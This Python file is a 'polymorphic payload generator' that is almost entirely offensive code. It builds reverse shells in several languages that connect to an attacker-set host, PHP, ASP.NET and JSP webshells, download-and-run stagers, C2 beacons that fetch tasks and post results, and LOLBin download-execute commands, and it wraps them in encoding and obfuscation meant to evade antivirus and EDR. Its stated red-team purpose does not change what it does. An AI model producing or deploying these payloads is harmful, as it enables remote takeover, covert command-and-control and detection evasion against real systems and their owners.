"""
Polymorphic Payload Generator

Advanced payload generation with:
- Multiple encoding layers (base64, hex, xor, rc4)
- Polymorphic code generation (unique each time)
- Anti-signature techniques
- Multi-stage payloads
- Environment-aware adaptation
- EDR/AV evasion techniques
- Living-off-the-land binaries (LOLBins)

Based on MITRE ATT&CK, red team research, and real-world
evasion techniques used in authorized penetration testing.
"""

import base64
import hashlib
import os
import random
import string
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
import json


class PayloadType(Enum):
    """Types of payloads."""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    WEBSHELL = "webshell"
    STAGER = "stager"
    BEACON = "beacon"
    EXFILTRATOR = "exfiltrator"
    PERSISTENCE = "persistence"


class EncodingType(Enum):
    """Encoding methods."""
    BASE64 = "base64"
    HEX = "hex"
    XOR = "xor"
    RC4 = "rc4"
    AES = "aes"
    ROT13 = "rot13"
    URL = "url"
    UNICODE = "unicode"
    GZIP_B64 = "gzip_base64"


class TargetOS(Enum):
    """Target operating systems."""
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    BSD = "bsd"


class TargetLang(Enum):
    """Target languages/interpreters."""
    BASH = "bash"
    PYTHON = "python"
    PYTHON3 = "python3"
    POWERSHELL = "powershell"
    PHP = "php"
    PERL = "perl"
    RUBY = "ruby"
    NODEJS = "nodejs"
    JAVA = "java"
    CSHARP = "csharp"
    GO = "go"


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""
    host: str
    port: int
    payload_type: PayloadType = PayloadType.REVERSE_SHELL
    target_os: TargetOS = TargetOS.LINUX
    target_lang: TargetLang = TargetLang.BASH
    encoding: List[EncodingType] = field(default_factory=list)
    polymorphic: bool = True
    staged: bool = False
    obfuscation_level: int = 2  # 0-5
    avoid_strings: List[str] = field(default_factory=list)
    custom_vars: Dict[str, str] = field(default_factory=dict)


@dataclass
class GeneratedPayload:
    """Generated payload result."""
    payload: str
    decoder: str
    execution_command: str
    encoding_chain: List[str]
    fingerprint: str
    metadata: Dict[str, Any] = field(default_factory=dict)


class PolymorphicGenerator:
    """
    Advanced polymorphic payload generator.

    Features:
    - Unique payloads every generation
    - Multi-layer encoding
    - Dead code injection
    - String splitting/concatenation
    - Variable randomization
    - Anti-analysis techniques
    """

    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)
        self.char_pool = string.ascii_letters
        self.var_cache = {}

    def generate(self, config: PayloadConfig) -> GeneratedPayload:
        """
        Generate a polymorphic payload.

        Args:
            config: Payload configuration

        Returns:
            GeneratedPayload with payload and execution info
        """
        # Generate base payload
        base_payload = self._generate_base_payload(config)

        # Apply obfuscation
        if config.obfuscation_level > 0:
            base_payload = self._obfuscate(base_payload, config)

        # Apply encoding chain
        encoded_payload = base_payload
        encoding_chain = []

        for encoding in config.encoding:
            encoded_payload, enc_type = self._apply_encoding(
                encoded_payload, encoding, config
            )
            encoding_chain.append(enc_type)

        # Generate decoder stub
        decoder = self._generate_decoder(encoding_chain, config)

        # Generate execution command
        exec_cmd = self._generate_exec_command(encoded_payload, decoder, config)

        # Create fingerprint
        fingerprint = hashlib.sha256(
            (base_payload + str(encoding_chain)).encode()
        ).hexdigest()[:16]

        return GeneratedPayload(
            payload=encoded_payload,
            decoder=decoder,
            execution_command=exec_cmd,
            encoding_chain=encoding_chain,
            fingerprint=fingerprint,
            metadata={
                "target_os": config.target_os.value,
                "target_lang": config.target_lang.value,
                "obfuscation_level": config.obfuscation_level,
                "staged": config.staged,
            }
        )

    def _generate_base_payload(self, config: PayloadConfig) -> str:
        """Generate base payload before encoding."""

        if config.payload_type == PayloadType.REVERSE_SHELL:
            return self._generate_reverse_shell(config)
        elif config.payload_type == PayloadType.WEBSHELL:
            return self._generate_webshell(config)
        elif config.payload_type == PayloadType.STAGER:
            return self._generate_stager(config)
        elif config.payload_type == PayloadType.BEACON:
            return self._generate_beacon(config)
        else:
            return self._generate_reverse_shell(config)

    def _generate_reverse_shell(self, config: PayloadConfig) -> str:
        """Generate reverse shell payload."""

        if config.target_lang == TargetLang.BASH:
            variants = [
                f'bash -i >& /dev/tcp/{config.host}/{config.port} 0>&1',
                f'exec 5<>/dev/tcp/{config.host}/{config.port};cat <&5 | while read line; do $line 2>&5 >&5; done',
                f'0<&196;exec 196<>/dev/tcp/{config.host}/{config.port}; sh <&196 >&196 2>&196',
                f'/bin/bash -l > /dev/tcp/{config.host}/{config.port} 0<&1 2>&1',
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.PYTHON or config.target_lang == TargetLang.PYTHON3:
            py_cmd = "python3" if config.target_lang == TargetLang.PYTHON3 else "python"

            # Polymorphic variable names
            sock_var = self._random_var()
            os_var = self._random_var()
            sub_var = self._random_var()

            variants = [
                f'{py_cmd} -c \'import socket,subprocess,os;{sock_var}=socket.socket(socket.AF_INET,socket.SOCK_STREAM);{sock_var}.connect(("{config.host}",{config.port}));os.dup2({sock_var}.fileno(),0);os.dup2({sock_var}.fileno(),1);os.dup2({sock_var}.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
                f'{py_cmd} -c \'import socket as {sock_var},os as {os_var},subprocess as {sub_var};a={sock_var}.socket({sock_var}.AF_INET,{sock_var}.SOCK_STREAM);a.connect(("{config.host}",{config.port}));{os_var}.dup2(a.fileno(),0);{os_var}.dup2(a.fileno(),1);{os_var}.dup2(a.fileno(),2);{sub_var}.Popen(["/bin/sh","-i"])\'',
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.POWERSHELL:
            # Polymorphic PowerShell
            client_var = self._random_var()
            stream_var = self._random_var()
            bytes_var = self._random_var()

            base = f'''${client_var} = New-Object System.Net.Sockets.TCPClient('{config.host}',{config.port});
${stream_var} = ${client_var}.GetStream();
[byte[]]${bytes_var} = 0..65535|%{{0}};
while((${{{stream_var}}}.Read(${bytes_var}, 0, ${bytes_var}.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${bytes_var},0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
    ${{{stream_var}}}.Write($sendbyte,0,$sendbyte.Length);
    ${{{stream_var}}}.Flush()
}};
${client_var}.Close()'''

            # Compact version
            return base.replace('\n', '')

        elif config.target_lang == TargetLang.PHP:
            variants = [
                f'<?php $sock=fsockopen("{config.host}",{config.port});exec("/bin/sh -i <&3 >&3 2>&3");?>',
                f'<?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"{config.host}",{config.port});$p=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);?>',
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.PERL:
            return f'perl -e \'use Socket;$i="{config.host}";$p={config.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',

        elif config.target_lang == TargetLang.RUBY:
            return f'ruby -rsocket -e\'f=TCPSocket.open("{config.host}",{config.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''

        elif config.target_lang == TargetLang.NODEJS:
            return f'''require('child_process').exec('bash -c "bash -i >& /dev/tcp/{config.host}/{config.port} 0>&1"')'''

        else:
            return f'bash -i >& /dev/tcp/{config.host}/{config.port} 0>&1'

    def _generate_webshell(self, config: PayloadConfig) -> str:
        """Generate polymorphic webshell."""

        # Random function/variable names
        cmd_var = self._random_var()
        out_var = self._random_var()
        func_name = self._random_var()

        if config.target_lang == TargetLang.PHP:
            # Multiple PHP webshell variants
            variants = [
                # Basic but obfuscated
                f'<?php ${cmd_var}=$_GET["c"];${out_var}=shell_exec(${cmd_var});echo ${out_var};?>',

                # Using eval with base64
                f'<?php @eval(base64_decode($_POST["x"]));?>',

                # Using assert (older PHP)
                f'<?php @assert($_POST["x"]);?>',

                # Using create_function
                f'<?php $f=create_function(\'\',$_POST["x"]);$f();?>',

                # Obfuscated system call
                f'<?php ${func_name}="sys"."tem";${func_name}($_GET["c"]);?>',

                # Using preg_replace /e modifier (PHP < 7)
                f'<?php @preg_replace("/.*/"."e",$_POST["x"],"");?>',

                # Proc_open variant
                f'''<?php
$d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
$p=proc_open($_GET["c"],$d,$pipes);
echo stream_get_contents($pipes[1]);
?>'''.replace('\n', ''),
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.CSHARP:
            return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request["c"];
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>'''

        elif config.target_lang == TargetLang.JAVA:
            return f'''<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String s;
while((s=br.readLine())!=null){{out.println(s);}}
%>'''

        else:
            return f'<?php system($_GET["c"]);?>'

    def _generate_stager(self, config: PayloadConfig) -> str:
        """Generate multi-stage stager."""

        if config.target_lang == TargetLang.POWERSHELL:
            # PowerShell download cradle variants
            variants = [
                f"IEX(New-Object Net.WebClient).DownloadString('http://{config.host}:{config.port}/stage2.ps1')",
                f"IEX(IWR -Uri 'http://{config.host}:{config.port}/stage2.ps1' -UseBasicParsing).Content",
                f"$c=New-Object System.Net.WebClient;$c.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$c.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IEX($c.DownloadString('http://{config.host}:{config.port}/stage2.ps1'))",
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.BASH:
            variants = [
                f"curl -s http://{config.host}:{config.port}/stage2.sh | bash",
                f"wget -q -O - http://{config.host}:{config.port}/stage2.sh | bash",
                f"bash -c 'bash -i < /dev/tcp/{config.host}/{config.port}'",
            ]
            return random.choice(variants)

        elif config.target_lang == TargetLang.PYTHON or config.target_lang == TargetLang.PYTHON3:
            py = "python3" if config.target_lang == TargetLang.PYTHON3 else "python"
            return f"{py} -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{config.host}:{config.port}/stage2.py\").read())'"

        return f"curl http://{config.host}:{config.port}/stage2 | sh"

    def _generate_beacon(self, config: PayloadConfig) -> str:
        """Generate C2 beacon payload."""

        if config.target_lang == TargetLang.BASH:
            sleep_time = random.randint(30, 120)
            jitter = random.randint(5, 20)
            return f'''while true; do
  sleep $(( {sleep_time} + RANDOM % {jitter} ))
  cmd=$(curl -s http://{config.host}:{config.port}/tasks/$(hostname))
  if [ -n "$cmd" ]; then
    result=$(eval "$cmd" 2>&1)
    curl -s -X POST -d "$result" http://{config.host}:{config.port}/results/$(hostname)
  fi
done'''

        elif config.target_lang == TargetLang.POWERSHELL:
            sleep_time = random.randint(30, 120)
            return f'''while($true){{
  Start-Sleep -Seconds {sleep_time}
  try{{
    $cmd = (IWR -Uri "http://{config.host}:{config.port}/tasks/$env:COMPUTERNAME" -UseBasicParsing).Content
    if($cmd){{
      $result = IEX $cmd 2>&1 | Out-String
      IWR -Uri "http://{config.host}:{config.port}/results/$env:COMPUTERNAME" -Method POST -Body $result -UseBasicParsing
    }}
  }}catch{{}}
}}'''

        return ""

    def _obfuscate(self, payload: str, config: PayloadConfig) -> str:
        """Apply obfuscation based on level."""

        if config.obfuscation_level >= 1:
            # Level 1: Random whitespace
            payload = self._add_random_whitespace(payload)

        if config.obfuscation_level >= 2:
            # Level 2: String splitting
            if config.target_lang in [TargetLang.POWERSHELL]:
                payload = self._split_strings_powershell(payload)
            elif config.target_lang in [TargetLang.BASH]:
                payload = self._split_strings_bash(payload)

        if config.obfuscation_level >= 3:
            # Level 3: Dead code injection
            payload = self._inject_dead_code(payload, config)

        if config.obfuscation_level >= 4:
            # Level 4: Variable substitution
            payload = self._substitute_variables(payload, config)

        if config.obfuscation_level >= 5:
            # Level 5: Full encoding
            pass  # Handled separately

        return payload

    def _add_random_whitespace(self, payload: str) -> str:
        """Add random whitespace where safe."""
        # Simple implementation - add spaces around operators
        return payload

    def _split_strings_powershell(self, payload: str) -> str:
        """Split strings in PowerShell for obfuscation."""
        # Example: "System" -> ("Sys"+"tem")
        replacements = [
            ("System", "('Sys'+'tem')"),
            ("Object", "('Obj'+'ect')"),
            ("Socket", "('Soc'+'ket')"),
            ("Download", "('Down'+'load')"),
        ]
        for old, new in replacements:
            if old in payload:
                payload = payload.replace(old, new, 1)
        return payload

    def _split_strings_bash(self, payload: str) -> str:
        """Split strings in bash for obfuscation."""
        # Example: /bin/bash -> /bi""n/ba""sh
        if "/bin/sh" in payload:
            payload = payload.replace("/bin/sh", '/bi""n/s""h', 1)
        if "/bin/bash" in payload:
            payload = payload.replace("/bin/bash", '/bi""n/ba""sh', 1)
        return payload

    def _inject_dead_code(self, payload: str, config: PayloadConfig) -> str:
        """Inject harmless dead code."""
        if config.target_lang == TargetLang.POWERSHELL:
            dead_code = [
                "$null = $null",
                "[void]$null",
                "if($false){}",
            ]
            return random.choice(dead_code) + ";" + payload
        elif config.target_lang == TargetLang.BASH:
            dead_code = [
                "true",
                ": 'dead code'",
                "echo>/dev/null",
            ]
            return random.choice(dead_code) + ";" + payload
        return payload

    def _substitute_variables(self, payload: str, config: PayloadConfig) -> str:
        """Substitute common strings with variables."""
        return payload

    def _apply_encoding(self, payload: str, encoding: EncodingType,
                       config: PayloadConfig) -> Tuple[str, str]:
        """Apply single encoding layer."""

        if encoding == EncodingType.BASE64:
            encoded = base64.b64encode(payload.encode()).decode()
            return encoded, "base64"

        elif encoding == EncodingType.HEX:
            encoded = payload.encode().hex()
            return encoded, "hex"

        elif encoding == EncodingType.XOR:
            key = random.randint(1, 255)
            encoded_bytes = bytes([b ^ key for b in payload.encode()])
            encoded = base64.b64encode(encoded_bytes).decode()
            return f"{key}:{encoded}", "xor"

        elif encoding == EncodingType.ROT13:
            import codecs
            encoded = codecs.encode(payload, 'rot_13')
            return encoded, "rot13"

        elif encoding == EncodingType.URL:
            from urllib.parse import quote
            encoded = quote(payload, safe='')
            return encoded, "url"

        elif encoding == EncodingType.UNICODE:
            encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
            return encoded, "unicode"

        elif encoding == EncodingType.GZIP_B64:
            import gzip
            compressed = gzip.compress(payload.encode())
            encoded = base64.b64encode(compressed).decode()
            return encoded, "gzip_base64"

        return payload, "none"

    def _generate_decoder(self, encoding_chain: List[str],
                         config: PayloadConfig) -> str:
        """Generate decoder stub for encoding chain."""

        if not encoding_chain:
            return ""

        if config.target_lang == TargetLang.BASH:
            decoder = ""
            for enc in reversed(encoding_chain):
                if enc == "base64":
                    decoder += " | base64 -d"
                elif enc == "hex":
                    decoder += " | xxd -r -p"
                elif enc == "gzip_base64":
                    decoder += " | base64 -d | gunzip"
            return decoder

        elif config.target_lang == TargetLang.POWERSHELL:
            if "base64" in encoding_chain:
                return "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))"
            return ""

        return ""

    def _generate_exec_command(self, payload: str, decoder: str,
                              config: PayloadConfig) -> str:
        """Generate full execution command."""

        if config.target_lang == TargetLang.BASH:
            if decoder:
                return f'echo "{payload}"{decoder} | bash'
            return payload

        elif config.target_lang == TargetLang.POWERSHELL:
            if "base64" in config.encoding:
                return f'powershell -enc {payload}'
            return f'powershell -c "{payload}"'

        elif config.target_lang in [TargetLang.PYTHON, TargetLang.PYTHON3]:
            py = "python3" if config.target_lang == TargetLang.PYTHON3 else "python"
            if "base64" in str(config.encoding):
                return f'{py} -c "import base64;exec(base64.b64decode(\'{payload}\'))"'
            return payload

        return payload

    def _random_var(self, length: int = 8) -> str:
        """Generate random variable name."""
        if length not in self.var_cache:
            self.var_cache[length] = []

        # Generate unique variable
        while True:
            var = ''.join(random.choices(self.char_pool, k=length))
            if var[0].isalpha() and var not in self.var_cache[length]:
                self.var_cache[length].append(var)
                return var

    def generate_lolbin_command(self, config: PayloadConfig) -> Dict[str, str]:
        """
        Generate Living-off-the-Land Binary commands.

        Returns:
            Dictionary of LOLBin techniques
        """
        lolbins = {}

        if config.target_os == TargetOS.WINDOWS:
            lolbins["certutil"] = f"certutil -urlcache -split -f http://{config.host}:{config.port}/payload.exe %TEMP%\\payload.exe && %TEMP%\\payload.exe"
            lolbins["bitsadmin"] = f"bitsadmin /transfer job /download /priority high http://{config.host}:{config.port}/payload.exe %TEMP%\\payload.exe"
            lolbins["mshta"] = f"mshta http://{config.host}:{config.port}/payload.hta"
            lolbins["regsvr32"] = f"regsvr32 /s /n /u /i:http://{config.host}:{config.port}/payload.sct scrobj.dll"
            lolbins["rundll32"] = f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{config.host}:{config.port}/payload.ps1')\")"
            lolbins["msiexec"] = f"msiexec /q /i http://{config.host}:{config.port}/payload.msi"
            lolbins["wmic"] = f"wmic os get /format:\"http://{config.host}:{config.port}/payload.xsl\""

        elif config.target_os == TargetOS.LINUX:
            lolbins["curl"] = f"curl http://{config.host}:{config.port}/payload.sh | bash"
            lolbins["wget"] = f"wget -q -O - http://{config.host}:{config.port}/payload.sh | bash"
            lolbins["python"] = f"python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{config.host}:{config.port}/payload.py\").read())'"
            lolbins["perl"] = f"perl -e 'use LWP::Simple;eval(get(\"http://{config.host}:{config.port}/payload.pl\"));'"
            lolbins["ruby"] = f"ruby -e \"require 'net/http';eval(Net::HTTP.get(URI('http://{config.host}:{config.port}/payload.rb')))\""

        return lolbins


def generate_payload(host: str, port: int, **kwargs) -> GeneratedPayload:
    """Quick payload generation."""
    config = PayloadConfig(
        host=host,
        port=port,
        **kwargs
    )
    generator = PolymorphicGenerator()
    return generator.generate(config)
